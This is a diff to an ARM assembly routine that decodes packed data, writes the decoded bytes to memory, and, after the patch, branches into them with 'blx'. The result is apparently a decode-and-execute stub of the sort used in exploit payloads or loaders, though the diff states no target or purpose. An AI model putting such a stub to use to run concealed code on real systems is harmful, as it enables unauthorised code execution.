@@ -8,7 +8,7 @@ _start:
 push {r0-r7, lr}
 
 @ load data
-add r3,#0x69
+add r3,#0x6F
 ldmia r3,{r0,r1,r2,r4,r5}
 push {r2,r4,r5}
 ldr r0,[r0]                      @ load base pointer
@@ -34,13 +34,15 @@ add r4,r4,#0x4
 bl _decode
 pop {r2}                        
 add r2,r2,r0                    @ r2 = location; r7 = size;
-add r4,r4,#0x22
+add r2,r2,r5
+add r4,r4,#0xA
 
 _write:
 cmp r7,#0x0                     @ if size 0; end
 beq _end
 sub r7,r7,#0x1                  @ decrement loop counter (size)
 
+add r4,r4,#0x18
 mov r5,#0x5
 push {r5}
 
@@ -52,9 +54,9 @@ beq _write
 push {r5}
 
 bl _decode                      @ decode r4 command into r5 (destroys data in r6 as well)
-strb r2,r5                      @ store value of r5 in location r2
+strb r5,[r2]                      @ store value of r5 in location r2
 add r4,r4,#0x4                  @ increment read location
-add r2,r2,#0x2                  @ increment write location
+add r2,r2,#0x1                  @ increment write location
 b _mini_loop
 
 pop {r2}
@@ -62,6 +64,8 @@ b _end
 
 _trigger:
 pop {r2}                        @ stack fixed!
+add r1,r0,r2
+blx r1
 b _end
 
 _decode:
